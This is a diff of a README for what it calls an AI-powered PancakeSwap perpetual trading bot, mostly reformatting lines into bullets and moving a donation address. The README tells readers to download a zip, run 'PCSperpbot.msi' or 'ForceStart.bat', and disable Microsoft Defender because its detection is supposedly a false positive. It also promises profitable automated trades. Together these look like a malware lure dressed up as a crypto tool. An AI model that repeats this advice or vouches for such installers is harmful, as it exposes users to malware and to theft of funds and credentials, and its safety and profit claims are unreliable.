@@ -7,14 +7,15 @@
 
 ## Running the bot is very easy:
 
-Download the [repo.](https://github.com/PredictBots/Pancakeswap-Perpatual-Trading-Bot/archive/refs/heads/main.zip)
-Run the **PCSperpbot.msi**
-Go to the Pancakeswap Perpetual Trading page.
-The auto start button will automatically appear as shown in the screenshot above.
-(If you get an error, you can run the bot by double-clicking the "ForceStart.bat" file.)
+- Download the [repo.](https://github.com/PredictBots/Pancakeswap-Perpatual-Trading-Bot/archive/refs/heads/main.zip)
+- Run the **PCSperpbot.msi**
+- Go to the Pancakeswap Perpetual Trading page.
+- The auto start button will automatically appear as shown in the screenshot above.
+- (If you get an error, you can run the bot by double-clicking the "ForceStart.bat" file.)
 
-Open and Close Profitable Perpetual Trades Automatically on PancakeSwap
-Our bot uses artificial intelligence technology to make powerful predictions for Perpetual trades on PancakeSwap and automatically opens and closes perpetual trades.
+- Open and Close Profitable Perpetual Trades Automatically on PancakeSwap
+- Our bot uses artificial intelligence technology to make powerful predictions for
+- Perpetual trades on PancakeSwap and automatically opens and closes perpetual trades.
 
 ## 🐰⚡ Installation on CMD
 
@@ -39,31 +40,34 @@ cd Pancakeswap-Perpatual-Trading-Bot
 
 ## Features:
 
-Automatic Trade Opening and Closing
-AI-powered Powerful Predictions
-Risk Management
-Easy to Use
-24/7 Support
+- Automatic Trade Opening and Closing
+- AI-powered Powerful Predictions
+- Risk Management
+- Easy to Use
+- 24/7 Support
 
 ## Frequently Asked Questions:
 
-+Is the bot safe? Yes, our bot is safe. It may be detected by Microsoft Defender, but this is a false positive detection. We recommend disabling Defender for the bot to function properly.
-+How does the bot work? The bot uses an AI model to make predictions for PancakeSwap Perpetual trades and automatically opens and closes trades based on these predictions.
-+How profitable is the bot? The bot's profitability depends on market conditions. Past performance is not a guarantee of future results.
-+How can I get support? You can reach us 24/7 on our Telegram group: https://t.me/pancakeswapprediction
+- Is the bot safe? Yes, our bot is safe. It may be detected by Microsoft Defender, but this is a false positive detection. We recommend disabling Defender for the bot to function properly.
+- How does the bot work? The bot uses an AI model to make predictions for PancakeSwap Perpetual trades and automatically opens and closes trades based on these predictions.
+- How profitable is the bot? The bot's profitability depends on market conditions. Past performance is not a guarantee of future results.
+
+- How can I get support? You can reach us 24/7 on our Telegram group: https://t.me/pancakeswapprediction
 
 ## Notes:
 
-The bot's source codes are available on the Github repository.
-Users can also run the bot themselves if they wish.
-You can message us 24/7 on our Telegram address for any support and assistance.
+- The bot's source codes are available on the Github repository.
+- Users can also run the bot themselves if they wish.
+- You can message us 24/7 on our Telegram address for any support and assistance.
 
 ## Benefits of the Bot:
 
-Saves time
-More full automatic profitable perpetual trades
-Eliminates the risk of emotional decision-making
-24/7 trade tracking
+- Saves time
+- More full automatic profitable perpetual trades
+- Eliminates the risk of emotional decision-making
+- 24/7 trade tracking
+
+🙏 If you find this bot helpful, feel free to donate on BSC 🙏```0xAc45074eAb70eB5749b72115814dE42225e00800```
 
 ## PNL Screenshots:
 You can verify the authenticity of PNL evidence by scanning qr codes.
@@ -96,5 +100,3 @@ NEW PNLS ADDED:
 ## Thanks:
 
 Thank you for using our bot. If you have any questions or suggestions, please let us know.
-
-If you find this bot helpful, feel free to donate on BSC ```0xAc45074eAb70eB5749b72115814dE42225e00800```
